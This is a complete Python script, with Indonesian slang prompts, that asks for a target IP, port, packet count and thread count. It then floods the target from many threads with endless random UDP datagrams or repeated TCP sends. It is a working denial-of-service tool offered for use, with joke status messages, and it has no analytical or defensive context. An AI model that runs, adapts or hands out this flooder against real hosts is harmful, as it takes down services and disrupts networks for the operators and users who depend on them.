#!/usr/bin/env python3
#semdang melihat pencuri:3
import random
import socket
import threading

print("*** Xs~Revan ***")
print("*** Tools Dahlah ***")
ip = str(input(" Masukin Ip Tod:"))
port = int(input(" Masukin Portnya:"))
choice = str(input(" Kirim mank intel nya sekarang ?(ya/nope):"))
times = int(input(" Berapa paket tod ?:"))
threads = int(input(" Mau berapa Thread ?:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[0_<]","[>_0]","[>_<]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Samlekom, mamank bakso dah dateng!!")
		except:
			print("[!] Njir ketahuan penyamaran gua")

def run2():
	data = random._urandom(16)
	i = random.choice(("[0_<]","[>_0]","[>_<]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Samlekom, mamank siomay dah dateng!!")
		except:
			s.close()
			print("[*] Njir ketahuan lagi")

for ya in range(threads):
	if choice == 'ya':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
